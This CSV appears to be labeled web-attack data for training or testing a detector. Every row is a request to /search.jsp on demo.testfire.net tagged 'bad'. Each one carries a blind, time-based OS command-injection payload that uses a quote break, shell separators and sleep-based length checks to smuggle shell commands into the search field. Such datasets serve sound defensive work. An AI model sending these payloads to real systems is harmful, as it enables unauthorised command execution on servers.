path,content,host,class_flag
"/search.jsp?query='
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo QZBRFT); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo QZBRFT); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo QZBRFT); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo QZBRFT); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo QZBRFT); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo QZBRFT); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo QZBRFT); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo QZBRFT); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo QZBRFT); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 1 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 2 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 3 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 4 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 5 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 6 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 7 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 8 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 9 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %5C%5C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo AGKSYR) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %5C%5C,,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ZGYOBQ); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ZGYOBQ); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ZGYOBQ); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ZGYOBQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ZGYOBQ); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ZGYOBQ); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ZGYOBQ); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ZGYOBQ); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ZGYOBQ); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='| [ 1 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='| [ 2 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='| [ 3 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='| [ 4 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='| [ 5 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='| [ 6 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='| [ 7 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='| [ 8 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='| [ 9 -ne $(echo IDQLWW | tr -d '\n' | wc -c) ] || sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %2F%2F,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BODWQD) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %2F%2F,,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FYHGFL)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %2F%2F",,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo PUPQPK); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo PUPQPK); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo PUPQPK); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo PUPQPK); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo PUPQPK); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo PUPQPK); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo PUPQPK); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo PUPQPK); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo PUPQPK); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,,demo.testfire.net,['bad']
/search.jsp?query='| [ 1 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='| [ 3 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='| [ 2 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='| [ 4 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='| [ 5 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='| [ 6 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='| [ 7 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='| [ 8 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='| [ 9 -ne $(echo UUMIWO | tr -d '\n' | wc -c) ] || sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %26,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %26,,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo GHEHAJ); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo GHEHAJ); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo GHEHAJ); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo GHEHAJ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo GHEHAJ); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo GHEHAJ); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo GHEHAJ); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo GHEHAJ); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo GHEHAJ); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 1 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 2 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 3 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 4 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 5 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 6 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 7 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 8 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='| [ 9 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %7C,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WGVBBV) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %7C,,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",,demo.testfire.net,['bad']
"/search.jsp?query=""; str=$(echo VJZVXS); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi ",,demo.testfire.net,['bad']
"/search.jsp?query=""; str=$(echo VJZVXS); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi ",,demo.testfire.net,['bad']
"/search.jsp?query=""; str=$(echo VJZVXS); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi ",,demo.testfire.net,['bad']
"/search.jsp?query=""; str=$(echo VJZVXS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi ",,demo.testfire.net,['bad']
"/search.jsp?query=""; str=$(echo VJZVXS); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi ",,demo.testfire.net,['bad']
"/search.jsp?query=""; str=$(echo VJZVXS); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi ",,demo.testfire.net,['bad']
"/search.jsp?query=""; str=$(echo VJZVXS); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi ",,demo.testfire.net,['bad']
"/search.jsp?query=""; str=$(echo VJZVXS); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi ",,demo.testfire.net,['bad']
"/search.jsp?query=""; str=$(echo VJZVXS); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi ",,demo.testfire.net,['bad']
"/search.jsp?query=""| [ 1 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""| [ 2 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""| [ 3 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""| [ 4 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""| [ 5 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""| [ 6 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""| [ 7 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""| [ 8 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""& sleep 0 && str=$(echo ATDESO) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""| [ 9 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""& sleep 0 && str=$(echo ATDESO) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""& sleep 0 && str=$(echo ATDESO) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""& sleep 0 && str=$(echo ATDESO) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""& sleep 0 && str=$(echo ATDESO) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 ",,demo.testfire.net,['bad']
"/search.jsp?query=""& sleep 0 && str=$(echo ATDESO) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 ",,demo.testfire.net,['bad']
